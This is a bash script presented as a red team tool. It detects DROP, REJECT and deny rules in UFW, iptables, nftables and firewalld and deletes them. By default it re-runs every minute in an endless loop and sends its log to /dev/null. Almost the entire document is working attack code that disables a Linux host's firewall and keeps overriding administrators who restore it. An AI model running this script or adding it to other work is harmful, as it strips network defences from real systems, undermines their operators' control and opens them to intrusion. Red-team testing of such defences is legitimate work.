#!/bin/bash
#
# firewall-unblock.sh
# Red team tool: checks common Linux firewalls for blocking (DROP/REJECT) rules
# and removes them. Runs every minute by default (or once with "once").
#
# Targets: UFW, nftables, iptables, firewalld
# Requires: root (or sudo) for modifying firewall state.
#

LOG="${LOG:-/dev/null}"
log() { echo "[$(date -Iseconds)] $*" | tee -a "$LOG"; }

# --- UFW ---
clear_ufw_blocking() {
    command -v ufw &>/dev/null || return 0
    ufw status 2>/dev/null | grep -q "inactive" && return 0

    local n
    ufw status numbered 2>/dev/null | grep -E "DENY|REJECT|DROP" | sed -n 's/^\[ *\([0-9]*\)\].*/\1/p' | sort -rn | while read -r n; do
        [ -z "$n" ] && continue
        ufw --force delete "$n" 2>/dev/null && log "UFW: deleted rule $n" || true
    done
}

# --- iptables (delete in reverse order by line number) ---
clear_iptables_blocking() {
    command -v iptables &>/dev/null || return 0

    local chain num
    for chain in INPUT OUTPUT FORWARD; do
        iptables -L "$chain" -n --line-numbers 2>/dev/null | grep -E "DROP|REJECT" | awk '{print $1}' | sort -rn | while read -r num; do
            [ -z "$num" ] && continue
            iptables -D "$chain" "$num" 2>/dev/null && log "iptables: deleted $chain rule $num" || true
        done
    done
}

# --- nftables (delete rules with drop/reject by handle) ---
clear_nftables_blocking() {
    command -v nft &>/dev/null || return 0

    local table chain handle
    nft -a list ruleset 2>/dev/null | while read -r line; do
        if [[ "$line" =~ ^table[[:space:]]+([^[:space:]]+) ]]; then
            table="${BASH_REMATCH[1]}"
        elif [[ "$line" =~ ^[[:space:]]*chain[[:space:]]+([^[:space:]]+) ]]; then
            chain="${BASH_REMATCH[1]}"
        elif [[ "$line" =~ (drop|reject) ]] && [[ "$line" =~ handle[[:space:]]+([0-9]+) ]]; then
            handle="${BASH_REMATCH[1]}"
            nft delete rule "$table" "$chain" handle "$handle" 2>/dev/null && log "nftables: deleted $table $chain handle $handle" || true
        fi
    done
}

# --- firewalld (rich rules and direct rules that drop/reject) ---
clear_firewalld_blocking() {
    command -v firewall-cmd &>/dev/null || return 0
    systemctl is-active firewalld &>/dev/null || return 0

    local rule
    firewall-cmd --list-rich-rules 2>/dev/null | while IFS= read -r rule; do
        [[ -z "$rule" ]] && continue
        if echo "$rule" | grep -qE "drop|reject"; then
            firewall-cmd --permanent --remove-rich-rule="$rule" 2>/dev/null && log "firewalld: removed rich rule (drop/reject)" || true
        fi
    done

    local ipv chain line
    for ipv in ipv4 ipv6; do
        for chain in INPUT OUTPUT FORWARD; do
            firewall-cmd --direct --get-rules "$ipv" filter "$chain" 2>/dev/null | while IFS= read -r line; do
                [[ -z "$line" ]] && continue
                if echo "$line" | grep -qE "drop|reject"; then
                    firewall-cmd --direct --remove-rule "$ipv" filter "$chain" $line 2>/dev/null && log "firewalld: removed direct $chain rule" || true
                fi
            done
        done
    done
    firewall-cmd --reload 2>/dev/null || true
}

run_once() {
    clear_ufw_blocking
    clear_iptables_blocking
    clear_nftables_blocking
    clear_firewalld_blocking
}

# --- main ---
INTERVAL="${INTERVAL:-60}"

if [[ "${1:-}" == "once" ]]; then
    run_once
    exit 0
fi

log "firewall-unblock started (interval ${INTERVAL}s)"
while true; do
    run_once
    sleep "$INTERVAL"
done
